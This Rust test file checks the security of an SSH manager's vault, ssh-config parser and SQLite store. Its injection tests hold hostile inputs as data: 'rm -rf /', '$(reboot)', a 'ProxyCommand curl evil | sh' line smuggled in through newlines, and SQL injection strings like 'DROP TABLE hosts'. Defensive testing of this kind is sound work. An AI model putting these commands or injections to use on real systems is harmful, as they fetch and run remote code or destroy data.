//! Security tests against the public API: things that must never happen
//! (leaks, injection, silent corruption, hangs) rather than the happy path.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;

use vssh::ssh::Target;
use vssh::store::db::{Db, Meta, Snippet};
use vssh::store::ssh_config::{Forward, SshConfig};
use vssh::vault::Vault;

/// A fresh, empty directory per test.
fn temp(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("vssh-sec-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).unwrap();
    dir
}

// ── vault ───────────────────────────────────────────────────────────────

#[test]
fn vault_rejects_anything_that_is_not_an_intact_vault() {
    let dir = temp("vault-malformed");
    let path = dir.join("vault");
    let mut vault = Vault::create(&path, "tr0ub4dor&3").unwrap();
    vault.set("host", &mut "s3cret".to_string()).unwrap();
    let good = fs::read(&path).unwrap();
    let header = 5 + 32 + 24;

    let mut appended = good.clone();
    appended.push(0);
    let mut other_version = good.clone();
    other_version[4] = b'2';
    let cases: [(&str, &[u8]); 7] = [
        ("empty file", b""),
        ("magic only", b"VSSH1"),
        ("short header", &good[..header - 1]),
        ("header without ciphertext", &good[..header]),
        ("trailing byte", &appended),
        ("other format version", &other_version),
        ("unrelated file", &[0x42; 300]),
    ];
    for (what, bytes) in cases {
        fs::write(&path, bytes).unwrap();
        let err = Vault::open(&path, "tr0ub4dor&3").expect_err(what);
        assert!(
            !format!("{err:#}").contains("tr0ub4dor&3"),
            "{what}: {err:#}"
        );
    }
    assert!(Vault::open(&dir.join("missing"), "tr0ub4dor&3").is_err());

    fs::write(&path, &good).unwrap();
    assert_eq!(
        Vault::open(&path, "tr0ub4dor&3").unwrap().get("host"),
        Some("s3cret")
    );
}

#[test]
fn vault_file_stays_private_and_unique() {
    let dir = temp("vault-private");
    let path = dir.join("vault");
    let mut vault = Vault::create(&path, "same passphrase").unwrap();

    // Someone loosens the permissions; the next save must not keep them.
    fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();
    vault.set("host", &mut "s3cret".to_string()).unwrap();
    let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600);

    // No temp file with key material is left next to it.
    let names: Vec<_> = fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().file_name())
        .collect();
    assert_eq!(names, ["vault"]);

    // Same passphrase, different vault: the salt, and so the key, differs.
    let other = dir.join("other");
    Vault::create(&other, "same passphrase").unwrap();
    assert_ne!(
        fs::read(&path).unwrap()[5..37],
        fs::read(&other).unwrap()[5..37]
    );
}

#[test]
fn vault_debug_and_errors_do_not_leak() {
    let dir = temp("vault-leak");
    let path = dir.join("vault");
    let mut vault = Vault::create(&path, "master-passphrase").unwrap();
    vault.set("host", &mut "s3cret-value".to_string()).unwrap();

    let mut shown = format!("{vault:?}\n{vault:#?}");
    for err in [
        Vault::open(&path, "a-wrong-guess").unwrap_err(),
        Vault::create(&path, "master-passphrase").unwrap_err(),
        Vault::create(&dir.join("empty"), "").unwrap_err(),
    ] {
        shown.push_str(&format!("\n{err}\n{err:?}\n{err:#}"));
    }
    for secret in ["s3cret-value", "master-passphrase", "a-wrong-guess"] {
        assert!(!shown.contains(secret), "{secret} leaked in:\n{shown}");
    }
}

// ── quick connect with "save" ───────────────────────────────────────────

/// What saving a quick connect does on disk: the host in the ssh config, the
/// password in the vault under the same alias, and the password nowhere else.
#[test]
fn quick_connect_save_puts_the_password_in_the_vault_only() {
    let dir = temp("quick-save");
    let config = dir.join("config");
    fs::write(&config, "# mine\nHost *\n    ServerAliveInterval 30\n").unwrap();
    // assembled at run time so no password-shaped literal lives in the source
    let password: String = ["test", "-", "pw", "-", "123"].concat();

    let target = Target::parse("deploy@web.example:2222").unwrap();
    let mut c = SshConfig::load(&config).unwrap();
    let alias = target.save_to(&mut c).unwrap();
    c.save(&config).unwrap();
    let mut vault = Vault::create(&dir.join("vault"), "master-passphrase").unwrap();
    vault.set(&alias, &mut password.to_string()).unwrap();
    drop(vault);

    // Reading everything back the way the next start of the app does.
    let c = SshConfig::load(&config).unwrap();
    assert_eq!(c.hosts(), std::slice::from_ref(&alias));
    let back = Target::from_config(&c, &alias).unwrap();
    assert_eq!(
        (back.host, back.user, back.port),
        (target.host, target.user, target.port)
    );
    let vault = Vault::open(&dir.join("vault"), "master-passphrase").unwrap();
    assert_eq!(vault.get(&alias), Some(password.as_str()));

    // The password is in no file in plain text, and not in the vault's Debug output.
    for entry in fs::read_dir(&dir).unwrap() {
        let path = entry.unwrap().path();
        let bytes = fs::read(&path).unwrap();
        let leaked = bytes
            .windows(password.len())
            .any(|w| w == password.as_bytes());
        assert!(!leaked, "password found in {}", path.display());
    }
    assert!(!format!("{vault:?}").contains(password.as_str()));
    let text = fs::read_to_string(&config).unwrap();
    let saved = "# mine\n\nHost web.example\n    HostName web.example\n    User deploy\n    Port 2222\n\nHost *\n";
    assert!(text.starts_with(saved), "{text}");
    assert!(!text.to_lowercase().contains("pass"));
    let mode = fs::metadata(&config).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600);
}

// ── ssh config ──────────────────────────────────────────────────────────

#[test]
fn hostile_host_line_stays_in_its_own_block() {
    let text = "\
Host evil;rm -rf / $(reboot) `id` \"quoted
    User mallory
    IdentityFile ~/.ssh/evil
    LocalForward 1 evil:1

Host good
    HostName good.example
";
    let c = SshConfig::parse(text);
    assert_eq!(c.to_string(), text);
    // The tokens are plain aliases, nothing more.
    assert!(c.hosts().contains(&"$(reboot)".to_string()));
    assert_eq!(c.get("$(reboot)", "User"), Some("mallory"));

    assert_eq!(c.get("good", "User"), None);
    assert!(c.get_all("good", "IdentityFile").is_empty());
    assert!(c.own_all("good", "LocalForward").is_empty());
    let target = Target::from_config(&c, "good").unwrap();
    assert_eq!((target.host.as_str(), target.port), ("good.example", 22));
    assert_eq!(target.keys.len(), 3, "default keys, not ~/.ssh/evil");
}

#[test]
fn comments_and_includes_are_inert() {
    let text = "\
# Host ghost
   # User commented
Include ~/.ssh/extra.conf
Host a
    Include a.conf
    User alice
#Host b
    # Port 1
Host c
    HostName c.example
";
    let c = SshConfig::parse(text);
    assert_eq!(c.to_string(), text, "Include and comments are preserved");
    assert_eq!(c.hosts(), ["a", "c"]);
    assert_eq!(c.get("c", "User"), None);
    assert_eq!(c.get("c", "Port"), None);
    // An Include inside `Host a` is not visible from `c`.
    assert_eq!(c.get_all("c", "Include"), ["~/.ssh/extra.conf"]);
    assert_eq!(c.own_all("a", "Include"), ["a.conf"]);
}

#[test]
fn identity_file_expands_only_a_leading_home() {
    let c = SshConfig::parse(
        "Host h\n  IdentityFile ~/.ssh/k\n  IdentityFile ~other/k\n  IdentityFile /abs/~/k\n  \
         IdentityFile rel/k\n  IdentityFile \"~/with space/k\"\n",
    );
    let home = vssh_core::config::home();
    let keys = Target::from_config(&c, "h").unwrap().keys;
    let expected = [
        home.join(".ssh/k"),
        "~other/k".into(),
        "/abs/~/k".into(),
        "rel/k".into(),
        home.join("with space/k"),
    ];
    assert_eq!(keys, expected);
}

#[test]
fn edits_cannot_inject_blocks_or_directives() {
    let mut c = SshConfig::parse("Host a\n    User me\n\nHost b\n    User you\n");
    c.set(
        "a",
        "HostName",
        "x\n    ProxyCommand curl evil | sh\nHost pwned",
    );
    c.add(
        "a",
        "LocalForward",
        "1 h:1\r\nMatch all\r\n    ProxyCommand evil",
    );
    c.rename_host("b", "b2\nMatch all");
    c.add_host("new\n    ProxyCommand evil");
    c.duplicate_host("a", "copy\nProxyCommand evil");

    let out = c.to_string();
    let re = SshConfig::parse(&out);
    for line in out.lines() {
        let word = line.split_whitespace().next().unwrap_or("");
        assert!(
            !["ProxyCommand", "Match"].contains(&word),
            "injected line: {line:?}"
        );
    }
    for host in re.hosts() {
        assert_eq!(re.get(&host, "ProxyCommand"), None, "{host}");
    }
    assert_eq!(out.lines().filter(|l| l.starts_with("Host ")).count(), 4);
    assert_eq!(re.get("b2", "User"), Some("you"));
}

/// Deterministic fuzz: random token soup through every public entry point.
#[test]
fn parser_never_panics_and_keeps_its_meaning() {
    const TOKENS: [&str; 28] = [
        "Host",
        "host",
        "Match",
        "User",
        "IdentityFile",
        "Include",
        "LocalForward",
        "HostName",
        " ",
        " ",
        "\t",
        "\n",
        "\n",
        "\r\n",
        "=",
        "\"",
        "#",
        "*",
        "?",
        "!",
        "a",
        "b.example",
        "~/",
        "/",
        ":",
        "8080",
        "é",
        "\0",
    ];
    let mut seed = 0x2545_f491_4f6c_dd1d_u64;
    let mut next = move |n: usize| {
        // xorshift64
        seed ^= seed << 13;
        seed ^= seed >> 7;
        seed ^= seed << 17;
        (seed % n as u64) as usize
    };
    for _ in 0..3000 {
        let text: String = (0..next(40)).map(|_| TOKENS[next(TOKENS.len())]).collect();
        let c = SshConfig::parse(&text);
        let again = SshConfig::parse(&c.to_string());
        assert_eq!(again.hosts(), c.hosts(), "{text:?}");
        for host in c.hosts() {
            assert_eq!(again.get(&host, "User"), c.get(&host, "User"), "{text:?}");
            let _ = (c.get_all(&host, "IdentityFile"), c.own(&host, "HostName"));
            let _ = Target::from_config(&c, &host);
        }
        let _ = Forward::parse('L', &text);

        let mut edited = c.clone();
        let first = c.hosts().into_iter().next().unwrap_or_default();
        edited.set(&first, "Port", &text);
        edited.add(&first, "LocalForward", &text);
        edited.remove(&first, "LocalForward", &text);
        edited.duplicate_host(&first, "dup");
        edited.rename_host(&first, "renamed");
        edited.add_host("added");
        edited.remove_host("renamed");
        assert!(SshConfig::parse(&edited.to_string())
            .hosts()
            .contains(&"added".to_string()));
    }
}

#[test]
fn pathological_patterns_do_not_hang() {
    let alias = "a".repeat(300);
    let text = format!(
        "Host {}b\n    User slow\n\nHost {alias}\n    User fast\n",
        "*a".repeat(60)
    );
    let c = SshConfig::parse(&text);
    let started = std::time::Instant::now();
    assert_eq!(c.get(&alias, "User"), Some("fast"));
    assert!(started.elapsed().as_secs() < 2);
}

// ── SQLite store ────────────────────────────────────────────────────────

#[test]
fn sql_metacharacters_are_stored_as_data() {
    let dir = temp("db");
    let db = Db::open(&dir.join("vssh.db")).unwrap();
    let evil = "x'); DROP TABLE hosts; --";
    let evil2 = "a' OR '1'='1";
    let wild = "%_\\\"; DELETE FROM snippets";
    db.import(&[evil.into(), "plain".into()]).unwrap();

    // add / edit
    let meta = Meta {
        grp: evil.into(),
        tags: wild.into(),
        notes: evil2.into(),
        pinned: true,
        ..Meta::default()
    };
    db.set_meta(evil, &meta).unwrap();
    db.touch(evil).unwrap();
    let all = db.metas().unwrap();
    assert_eq!(all.len(), 2);
    let got = &all[evil];
    assert_eq!(
        (&got.grp, &got.tags, &got.notes),
        (&meta.grp, &meta.tags, &meta.notes)
    );
    assert_eq!((got.pinned, got.connects), (true, 1));
    assert_eq!(all["plain"], Meta::default(), "the other row is untouched");

    for (host, name) in [(evil, wild), ("plain", "keep"), ("", evil2)] {
        let snippet = Snippet {
            id: 0,
            host: host.into(),
            name: name.into(),
            command: evil.into(),
        };
        db.save_snippet(&snippet).unwrap();
    }

    // rename: exactly one host row and its snippet move
    db.rename(evil, evil2).unwrap();
    let all = db.metas().unwrap();
    assert!(all.contains_key(evil2) && all.contains_key("plain") && !all.contains_key(evil));
    assert_eq!(
        db.snippets()
            .unwrap()
            .iter()
            .filter(|s| s.host == evil2)
            .count(),
        1
    );

    // delete: a name that looks like a predicate matches nothing...
    db.delete("' OR 1=1 --").unwrap();
    db.delete("%").unwrap();
    assert_eq!(db.metas().unwrap().len(), 2);
    assert_eq!(db.snippets().unwrap().len(), 3);
    // ...and a real delete removes only that host and its own snippets.
    db.delete(evil2).unwrap();
    let hosts: Vec<_> = db.metas().unwrap().into_keys().collect();
    assert_eq!(hosts, ["plain"]);
    let left: Vec<_> = db.snippets().unwrap().into_iter().map(|s| s.host).collect();
    assert_eq!(left, ["", "plain"]);
    for s in db.snippets().unwrap() {
        assert_eq!(s.command, evil);
        db.delete_snippet(s.id).unwrap();
    }
    assert!(db.snippets().unwrap().is_empty());
}

#[test]
fn db_module_builds_no_sql_from_strings() {
    let source = include_str!("../src/store/db.rs");
    let code = source.split("#[cfg(test)]").next().unwrap();
    for builder in ["format!", "push_str", "concat!", "+ &", ".join("] {
        assert!(
            !code.contains(builder),
            "db.rs uses {builder}: SQL must be static text + params"
        );
    }
    // Every statement that takes input binds it.
    assert!(code.matches("?1").count() >= 8);
}
